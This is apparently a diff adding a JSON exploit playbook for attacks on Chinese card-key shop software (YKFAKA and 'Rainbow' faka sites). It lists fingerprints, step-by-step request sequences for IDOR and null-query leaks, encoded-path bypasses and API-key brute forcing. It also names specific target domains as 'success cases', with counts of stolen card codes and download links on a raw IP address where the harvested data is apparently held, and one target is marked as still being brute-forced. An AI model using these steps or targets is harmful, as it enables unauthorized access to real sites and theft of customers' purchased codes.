@@ -1,0 +1,115 @@
+{
+  "version": "2026-08-02",
+  "description": "All confirmed success cases → exploit patterns for break_by_playbook.py",
+  "patterns": [
+    {
+      "id": "ykfaka_null_km",
+      "name": "YKFAKA Query null → Query_Km",
+      "fingerprint": ["YKFAKA", "Query.html", "Query_Km", "ThinkPHP"],
+      "success_cases": [
+        {
+          "target": "mima1314.com",
+          "cards": 14642,
+          "ddids": 7197,
+          "status": "live_20260801",
+          "download": "http://103.185.249.13:18888/mima1314_cards_20260801.txt"
+        },
+        {
+          "target": "15118.cn",
+          "cards": 165,
+          "ddids": 904,
+          "status": "patched_20260801",
+          "download": "http://103.185.249.13:18888/15118.cn_cards_20260801.txt"
+        }
+      ],
+      "detect": {
+        "paths": ["/Query.html"],
+        "body_contains": ["YKFAKA", "优卡"]
+      },
+      "steps": [
+        "GET {base}/Query.html → __token__",
+        "POST {base}/Query.html body=value=null&page=1&__token__=... Referer Query.html",
+        "Parse /Query_Km/{12hex} from response",
+        "GET {base}/Query_Km/{ddid} Referer Query.html → card"
+      ],
+      "export_script": "mima1314_full_export.py"
+    },
+    {
+      "id": "rainbow_query_faka",
+      "name": "彩虹 mod=query 子串 → mod=faka",
+      "fingerprint": ["assets/faka", "showOrder", "ajax.php?act=getcount", "mysid"],
+      "path_variants": [
+        "{base}/?mod=query&data={q}",
+        "{base}shop/?mod=query&data={q}"
+      ],
+      "success_cases": [
+        {
+          "target": "qd93.com",
+          "path": "root",
+          "pairs": 19,
+          "cards": 13,
+          "queries": 1122,
+          "status": "live_20260801",
+          "download": "http://103.185.249.13:18888/qd93_cards_20260801.txt"
+        }
+      ],
+      "query_build": "0-9,00-99,000-999,130-199,pwd_list",
+      "steps": [
+        "GET {base} → PHPSESSID+mysid",
+        "GET {base}?mod=query&data={substring}",
+        "Parse showOrder(id,skey) or mod=faka links",
+        "GET ?mod=faka&id=&skey= → textarea card"
+      ],
+      "export_script": "qd93_full_export.py"
+    },
+    {
+      "id": "rainbow_api_search",
+      "name": "彩虹 api.php act=search IDOR",
+      "fingerprint": ["ajax.php?act=getcount", "api.php"],
+      "api_paths": [
+        "{base}api.php?act=search&id={id}",
+        "{base}shop/api.php?act=search&id={id}",
+        "{base}shop/%61pi.php/?act=search&id={id}",
+        "{base}shop/%2561pi.php?act=search&id={id}"
+      ],
+      "success_cases": [
+        {"target": "123.taoqqhao.com/shop/", "cards": 1413, "orders": 1653, "id_range": [1, 1653]},
+        {"target": "qq1234.cc/shop/", "cards": 84, "orders": 179, "id_range": [1, 179]},
+        {"target": "79yj.com", "cards": 115, "orders": 609, "id_range": [450, 595]},
+        {"target": "qq1.lol", "cards": 46442, "bundle": "20260618"},
+        {"target": "qq8.one", "cards": 38507, "bundle": "20260618"},
+        {"target": "yanzu.lol", "cards": 22262, "bundle": "20260618"},
+        {"target": "qw123.lol", "cards": 21705, "bundle": "20260618"},
+        {"target": "juzi668.top", "cards": 12313, "bundle": "20260618"},
+        {"target": "hmjf.lol", "cards": 16361, "bundle": "20260618"},
+        {"target": "baichuan.lol", "cards": 796, "bundle": "20260618"}
+      ],
+      "steps": [
+        "GET {base} → session",
+        "GET ajax.php?act=getcount → orders N",
+        "GET api.php?act=search&id=1..N (or %61pi with key brute)",
+        "Parse JSON km/card fields"
+      ],
+      "export_script": "faka_api_brute_fast.py / qq1-api-brute.py"
+    },
+    {
+      "id": "rainbow_api_key",
+      "name": "彩虹 %61pi.php API key 撞库",
+      "fingerprint": ["请提供用户登录信息或API对接密钥", "%61pi.php"],
+      "success_cases": [
+        {"target": "youhui1998.top/shop/", "status": "bruting_no_hit_yet", "orders": 55821}
+      ],
+      "steps": [
+        "GET {base} session",
+        "GET {base}%61pi.php/?key={k}&act=search&id={id}",
+        "Brute key from wordlist; on success batch id scan"
+      ],
+      "export_script": "yh_kami_jp.py / faka_api_brute_fast.py"
+    }
+  ],
+  "failed_or_hard": [
+    {"target": "xinhe001.lol/shop/", "reason": "query 0, api WAF, site 435"},
+    {"target": "hm0880.top", "reason": "no surface leak"},
+    {"target": "95lb.com", "reason": "独角 v5, signed API"}
+  ]
+}
